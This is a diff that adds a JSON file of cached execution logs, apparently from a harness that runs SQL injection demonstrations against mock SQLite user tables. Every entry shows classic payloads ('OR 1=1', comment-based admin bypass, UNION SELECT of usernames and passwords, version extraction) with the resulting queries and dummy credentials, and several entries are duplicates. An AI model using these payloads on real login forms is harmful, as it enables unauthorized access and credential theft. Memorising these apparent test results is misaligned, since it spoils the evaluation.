@@ -1,0 +1,62 @@
+{
+    "150a6389d3ddb687e11d5e3eefb8eab8d7abc3391a89b4ccaa63d11e6a204d0a": {
+        "success": true,
+        "logs": "[*] Attempting to bypass login using SQL Injection...\n[INFO] Simulating SQL query execution:\nSELECT * FROM users WHERE user = '' OR '1'='1'\n\n\n[*] The simulated query shows how the injected payload alters the SQL statement.\n    In a live system, this would likely grant unauthorized access.\n"
+    },
+    "b6519f8f7ef97befd2a3f551e6fd646d311ded838725c301081bbd4c18a842a2": {
+        "success": true,
+        "logs": "[*] Attempting to bypass login using SQL Injection...\n[INFO] Simulating SQL query execution:\nSELECT * FROM users WHERE user = '' OR '1'='1'\n\n\n[*] The simulated query shows how the injected payload alters the SQL statement.\n    In a live system, this would likely grant unauthorized access.\n"
+    },
+    "a4c848e2b7f5e32d973f581b319a56f81c0618bc19f7678e8211aecdea0c67a3": {
+        "success": true,
+        "logs": "--- Demonstrating SQL Injection Vulnerability ---\n\n[+] Attempting login with a legitimate username:\nSimulated SQL Query: SELECT * FROM users WHERE user = 'legit_user'\nExpected: Query for 'legit_user'. If user exists, login succeeds.\n\n[+] Attempting SQL Injection for Authentication Bypass:\nSimulated SQL Query: SELECT * FROM users WHERE user = '' OR '1'='1' --'\nExpected: Query becomes 'SELECT * FROM users WHERE user = '' OR '1'='1' --''.\nThis query will return all users (or the first user if LIMIT 1 is applied implicitly/explicitly), effectively bypassing authentication.\n"
+    },
+    "c47ef83871746498e3db0077f2f2c4b92f770a1dd8ef2bf8e92fe317dd84366d": {
+        "success": true,
+        "logs": "--- Demonstrating SQL Injection Vulnerability ---\n\n[+] Attempting login with a legitimate username:\nSimulated SQL Query: SELECT * FROM users WHERE user = 'legit_user'\nExpected: Query for 'legit_user'. If user exists, login succeeds.\n\n[+] Attempting SQL Injection for Authentication Bypass:\nSimulated SQL Query: SELECT * FROM users WHERE user = '' OR '1'='1' --'\nExpected: Query becomes 'SELECT * FROM users WHERE user = '' OR '1'='1' --''.\nThis query will return all users (or the first user if LIMIT 1 is applied implicitly/explicitly), effectively bypassing authentication.\n"
+    },
+    "856be7b8f1e06ceae2a189f8e01e016871f09a43e18a71cc48701a66b3c30de0": {
+        "success": true,
+        "logs": "--- Setting up mock database ---\n\n--- Attempting SQL Injection for Data Exfiltration ---\n[INFO] Injecting payload: 'dummy' UNION SELECT id, user, password FROM users --'\n[INFO] Executing SQL: SELECT id, user, password FROM users WHERE user = 'dummy' UNION SELECT id, user, password FROM users --'\n[SUCCESS] Query Results: [(1, 'admin', 'securepassword123'), (2, 'testuser', 'testpass')]\n\n--- Exploit complete ---\n[SUCCESS] The injected query successfully exfiltrated all user data.\n[EXFILTRATED DATA] [(1, 'admin', 'securepassword123'), (2, 'testuser', 'testpass')]\n"
+    },
+    "5af93c371c0ca6fa9650f659fa682c59e1482273464695755a1c7846fccdc15d": {
+        "success": true,
+        "logs": "--- Setting up mock database ---\n\n--- Attempting SQL Injection for Data Exfiltration ---\n[INFO] Injecting payload: 'dummy' UNION SELECT id, user, password FROM users --'\n[INFO] Executing SQL: SELECT id, user, password FROM users WHERE user = 'dummy' UNION SELECT id, user, password FROM users --'\n[SUCCESS] Query Results: [(1, 'admin', 'securepassword123'), (2, 'testuser', 'testpass')]\n\n--- Exploit complete ---\n[SUCCESS] The injected query successfully exfiltrated all user data.\n[EXFILTRATED DATA] [(1, 'admin', 'securepassword123'), (2, 'testuser', 'testpass')]\n"
+    },
+    "d7f941ed443f08ae08dd02983df1f56af85089fc19ce2fa095fb45bd75d50d9d": {
+        "success": true,
+        "logs": "--- Starting SQL Injection Exploit ---\nUsing payload: ' OR '1'='1\n[MOCK DB] Attempting to execute query: SELECT * FROM users WHERE user = '' OR '1'='1'\n\n--- Exploit Complete ---\nThe output above shows the constructed SQL query with the injected payload.\nIn a real application, this query would bypass authentication (e.g., log in as the first user) or return all user records, depending on the database interaction logic.\n"
+    },
+    "6ea2b34e5124a5d689c7fb30a0c588aed90c3a177a5d763005991eeb7896e1a3": {
+        "success": true,
+        "logs": "Database initialized with 'admin' and 'testuser'.\n\n--- DEMONSTRATION OF SQL INJECTION VULNERABILITY ---\n\n--- Scenario 1: Normal login attempt for 'testuser' ---\n\n[APP] Attempting login for username: 'testuser'\n\n[DB] Executing SQL: SELECT * FROM users WHERE user = 'testuser'\n[DB] Query returned: [('testuser', 'testpass')]\n[APP] Login successful for user: testuser (simulated)\n\n--- Scenario 2: SQL Injection to bypass authentication as 'admin' ---\nUsing injection payload: 'admin' --'\n\n[APP] Attempting login for username: 'admin' --'\n\n[DB] Executing SQL: SELECT * FROM users WHERE user = 'admin' --'\n[DB] Query returned: [('admin', 'securepassword123')]\n[APP] Login successful for user: admin (simulated)\n\n--- Scenario 3: SQL Injection to list all users ---\nUsing injection payload: '' OR 1=1 --'\n\n[APP] Attempting login for username: '' OR 1=1 --'\n\n[DB] Executing SQL: SELECT * FROM users WHERE user = '' OR 1=1 --'\n[DB] Query returned: [('admin', 'securepassword123'), ('testuser', 'testpass')]\n[APP] Login successful for user: admin (simulated)\n\n--- Scenario 4: SQL Injection to extract database version ---\nUsing injection payload: 'admin' UNION SELECT sqlite_version(), 'dummy_password' --'\n\n[APP] Attempting login for username: 'admin' UNION SELECT sqlite_version(), 'dummy_password' --'\n\n[DB] Executing SQL: SELECT * FROM users WHERE user = 'admin' UNION SELECT sqlite_version(), 'dummy_password' --'\n[DB] Query returned: [('3.51.2', 'dummy_password'), ('admin', 'securepassword123')]\n[APP] Login successful for user: 3.51.2 (simulated)\n\nDatabase connection closed.\n"
+    },
+    "515f7c934383a71570a3e23761e01e43daf12b95a3a9d5f283d05e50e073900a": {
+        "success": true,
+        "logs": "--- Demonstrating SQL Injection Bypass ---\n\nAttempting login with a legitimate user 'testuser':\nExecuting SQL: SELECT * FROM users WHERE user = 'testuser'\nLegitimate login result for 'testuser': [('testuser', 'testpass')]\n\nAttempting login with SQL Injection payload 'admin'--':\nExecuting SQL: SELECT * FROM users WHERE user = 'admin'--'\n\nExploit successful! Authentication bypassed.\nLogged in as user: admin\nFull record retrieved: [('admin', 'hashed_admin_password')]\n\n--- End of Demonstration ---\n"
+    },
+    "386e3b0d17e3613396458cce9a572dedecd283c829718670732fe216e7132b0d": {
+        "success": true,
+        "logs": "--- Demonstrating SQL Injection Bypass ---\n\nAttempting login with a legitimate user 'testuser':\nExecuting SQL: SELECT * FROM users WHERE user = 'testuser'\nLegitimate login result for 'testuser': [('testuser', 'testpass')]\n\nAttempting login with SQL Injection payload 'admin'--':\nExecuting SQL: SELECT * FROM users WHERE user = 'admin'--'\n\nExploit successful! Authentication bypassed.\nLogged in as user: admin\nFull record retrieved: [('admin', 'hashed_admin_password')]\n\n--- End of Demonstration ---\n"
+    },
+    "4b8abb5892dbcc9c9bf1d379e2b1ce58a8cecc084f8a67abf9def2bb521d5d30": {
+        "success": true,
+        "logs": "\n--- Initializing mock database ---\n\n--- Attempting normal login for 'admin' (should succeed) ---\nExecuting SQL: SELECT * FROM users WHERE user = 'admin'\nQuery results: [(1, 'admin', 'securepass')]\nAdmin login result: [(1, 'admin', 'securepass')]\n\n--- Attempting normal login for 'nonexistent_user' (should fail) ---\nExecuting SQL: SELECT * FROM users WHERE user = 'nonexistent_user'\nQuery results: []\nNonexistent user login result: []\n\n--- Attempting SQL Injection to bypass authentication ---\nUsing malicious username: ' OR 1=1 --\nExecuting SQL: SELECT * FROM users WHERE user = '' OR 1=1 --'\nQuery results: [(1, 'admin', 'securepass'), (2, 'testuser', 'testpass')]\nBypass login result: [(1, 'admin', 'securepass'), (2, 'testuser', 'testpass')]\nSUCCESS: SQL Injection authentication bypass demonstrated!\n\n--- Attempting SQL Injection to extract data (UNION-based) ---\nUsing malicious username for UNION attack: ' UNION SELECT 1, 'hacker', 'pwned' --\nExecuting SQL: SELECT * FROM users WHERE user = '' UNION SELECT 1, 'hacker', 'pwned' --'\nQuery results: [(1, 'hacker', 'pwned')]\nUNION attack result: [(1, 'hacker', 'pwned')]\nSUCCESS: SQL Injection UNION attack demonstrated!\n\nMock database connection closed.\n"
+    },
+    "1e4c0c31b96fd35c49b8ba0731f41b8d641cb3c145457cf54cf742e382c7f1d2": {
+        "success": true,
+        "logs": "--- Demonstrating SQL Injection Bypass ---\n\n[1] Attempting to log in with a legitimate, non-existent user (should return empty):\nExecuting SQL: SELECT * FROM users WHERE user = 'nonexistent_user'\nQuery Results: []\n\n[2] Attempting SQL Injection to bypass authentication (should return all users or the first user):\nExecuting SQL: SELECT * FROM users WHERE user = '' OR '1'='1 --'\nQuery Results: []\n\n[3] Attempting SQL Injection to extract all usernames and passwords (UNION-based attack):\nExecuting SQL: SELECT * FROM users WHERE user = '' UNION SELECT id, user, password FROM users --'\nQuery Results: [(1, 'admin', 'securepass123'), (2, 'testuser', 'testpass')]\n\n--- Exploit Demonstration Complete ---\n"
+    },
+    "a42f2b55f1f7b9f7867e5b5af967d1e4494577f74f0450172b887ad949efe62d": {
+        "success": true,
+        "logs": "--- Demonstrating SQL Injection Bypass ---\n\n[1] Attempting to log in with a legitimate, non-existent user (should return empty):\nExecuting SQL: SELECT * FROM users WHERE user = 'nonexistent_user'\nQuery Results: []\n\n[2] Attempting SQL Injection to bypass authentication (should return all users or the first user):\nExecuting SQL: SELECT * FROM users WHERE user = '' OR '1'='1 --'\nQuery Results: []\n\n[3] Attempting SQL Injection to extract all usernames and passwords (UNION-based attack):\nExecuting SQL: SELECT * FROM users WHERE user = '' UNION SELECT id, user, password FROM users --'\nQuery Results: [(1, 'admin', 'securepass123'), (2, 'testuser', 'testpass')]\n\n--- Exploit Demonstration Complete ---\n"
+    },
+    "5ac2fd8d2238103eac710b32f46028f729ebb54360edcddf6b73c4bbb6cf76b9": {
+        "success": true,
+        "logs": "--- 1. Legitimate Login Attempt (should find 'admin') ---\nExecuting query: SELECT * FROM users WHERE user = 'admin'\nQuery results:\n(1, 'admin', 'adminpass')\n\n--- 2. SQL Injection: Authentication Bypass ---\nExecuting query: SELECT * FROM users WHERE user = '' OR '1'='1 --'\nQuery results:\nNo results found.\n\n--- 3. SQL Injection: Data Extraction (UNION Attack) ---\nExecuting query: SELECT * FROM users WHERE user = '' UNION SELECT id, user, password FROM users --'\nQuery results:\n(1, 'admin', 'adminpass')\n(2, 'testuser', 'testpass')\n"
+    },
+    "486ed39b60e57cf8534d68fa9a2a12ae7f9ee4661eb1e8178e369a58f1758808": {
+        "success": true,
+        "logs": "--- 1. Legitimate Login Attempt (should find 'admin') ---\nExecuting query: SELECT * FROM users WHERE user = 'admin'\nQuery results:\n(1, 'admin', 'adminpass')\n\n--- 2. SQL Injection: Authentication Bypass ---\nExecuting query: SELECT * FROM users WHERE user = '' OR '1'='1 --'\nQuery results:\nNo results found.\n\n--- 3. SQL Injection: Data Extraction (UNION Attack) ---\nExecuting query: SELECT * FROM users WHERE user = '' UNION SELECT id, user, password FROM users --'\nQuery results:\n(1, 'admin', 'adminpass')\n(2, 'testuser', 'testpass')\n"
+    }
+}
